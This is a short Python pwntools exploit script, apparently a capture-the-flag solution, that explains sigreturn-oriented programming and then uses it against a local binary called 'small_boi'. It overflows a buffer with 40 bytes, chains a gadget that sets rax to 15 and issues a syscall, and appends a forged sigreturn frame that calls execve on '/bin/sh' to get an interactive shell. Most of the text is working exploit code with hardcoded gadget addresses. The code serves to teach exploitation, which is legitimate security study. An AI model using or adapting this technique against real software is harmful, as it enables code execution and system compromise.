#!/usr/bin/env python3

# thanks https://bananamafia.dev/post/srop/

"""

SROP is one of the ROP variants.

S is Sigreturn and is a technique that will force the overwrite of sigcontext.

Read the above link to better information.


Constraints:
    - syscall gadget
    - the way to set our eax/rax to 0xf (that is the syscall number of sigreturn()).
        check filippo.io
        15	rt_sigreturn	stub_rt_sigreturn	arch/x86/kernel/signal.c

So:
    - trigger your bof
    - change rax to contain 0xf and do syscall
    - then append your sigcontext that will contain: your arbitrary syscall (+parameters in registers) and RIP will contain the syscall gadget to trigger our exploit.

In this example we can trigger srop to get /bin/sh.
1. we will not force a leak to get /bin/sh since we find it in our program to exploit (addresses not randomized)
2. we will find gadget to put 0xf in rax and 'syscall' gadget.
3. we will craft our frame to call the syscall (execve in this case, but it may change according to the scenario).


"""

from pwn import *

context.arch = "amd64"

junk = b"A" * 40

mov_eax_gadget = p64(0x400180) # mov eax, 0xf; syscall;



frame = SigreturnFrame()
frame.rax = (0x3b) # execve()
frame.rdi = (0x4001ca) # /bin/sh
frame.rip = (0x400185) # syscall gadget


io = process("./small_boi")

io.send(junk + mov_eax_gadget + bytes(frame))

io.interactive()
